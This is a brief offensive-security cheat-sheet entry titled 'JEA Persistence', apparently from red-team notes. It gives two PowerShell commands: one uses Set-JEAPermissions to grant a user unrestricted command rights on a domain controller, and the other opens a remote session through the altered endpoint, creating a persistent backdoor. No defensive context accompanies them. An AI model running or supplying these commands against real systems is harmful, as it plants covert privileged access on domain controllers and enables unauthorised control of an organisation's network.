# JEA Persistence

### 1) Allows every commands to a user on a machine

    Set-JEAPermissions -ComputerName dc -SamAccountName user1 -Verbose

    Enter-PSSession -ComputerName dc -ConfigurationName microsoft.powershell64
